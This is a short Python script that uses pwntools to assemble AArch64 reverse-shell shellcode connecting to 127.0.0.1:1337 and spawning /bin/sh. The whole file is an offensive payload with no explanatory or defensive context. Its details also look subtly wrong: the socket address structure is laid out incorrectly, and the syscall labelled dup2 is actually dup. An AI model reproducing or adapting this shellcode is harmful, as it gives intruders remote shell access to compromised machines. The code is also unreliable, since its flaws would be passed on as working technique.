from pwn import asm, context

context.arch = 'aarch64'

shellcode = asm('''
    // socket(AF_INET, SOCK_STREAM, 0)
    mov x0, 2
    mov x1, 1
    mov x2, 0
    mov x8, 198
    svc #0

    mov x19, x0

    // sockaddr_in: 0x3905 = port 1337, AF_INET = 2
    movz x1, 0x3905
    movk x1, 0x7f01, lsl #16   // 127.0.0.1
    sub sp, sp, #0x20
    str w1, [sp]
    mov x1, sp
    mov x2, 16
    mov x0, x19
    mov x8, 203
    svc #0

    // dup2 loop
    mov x1, 0
dup2_loop:
    mov x0, x19
    mov x8, 23
    svc #0
    add x1, x1, 1
    cmp x1, 3
    b.ne dup2_loop

    // execve("/bin/sh", NULL, NULL)
    adr x0, binsh
    mov x1, 0
    mov x2, 0
    mov x8, 221
    svc #0

binsh:
    .ascii "/bin/sh\\0"
''')

print(', '.join(f'0x{b:02x}' for b in shellcode))
